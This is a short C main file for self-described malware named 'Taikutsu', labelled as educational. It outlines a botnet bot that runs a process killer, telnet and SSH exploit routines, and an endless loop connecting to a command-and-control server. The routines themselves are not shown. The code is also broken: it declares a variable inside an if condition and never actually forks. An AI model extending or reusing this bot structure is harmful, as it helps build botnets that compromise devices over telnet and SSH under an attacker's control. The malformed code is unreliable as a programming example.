#ifdef DEBUG
#include <stdio.h>
#endif

//
//Taikutsu "Boredom" Makware
//Written for Educational purposes.
//

#include "bool.h"
#include "conf.h"
#include "conn.h"
#include "exploit.h"
#include "includes.h"
#include "inetaddr.h"
#include "killer.h"
#include "stdafx.h"

int main(int argc, char *argv[]) {
	//./x86
#ifdef DEBUG
	//this is funny, it says boredom has started.
	printf("Taikutsu has started\n");
#endif

#ifdef DEBUG
	printf("Attempting to fork background process.\n");
#endif

	if(pid_t pid != -1) {
#ifdef DEBUG
		printf("Succesfully forked background process\n");
#endif
	}

//TODO: come back to the telnet scanner, and killer
#ifdef KILLER
killer_init();
#endif

#ifdef EXPLOIT_TELNET
exploit_telnet();
#endif

#ifdef EXPLOIT_SSH
exploit_ssh();
#endif

	while(TRUE) {

		if(conn_est() != FALSE) {
#ifdef DEBUG
		printf("Conection to C2 has been established.\n");
#endif
		}

	}	
	return FALSE;
}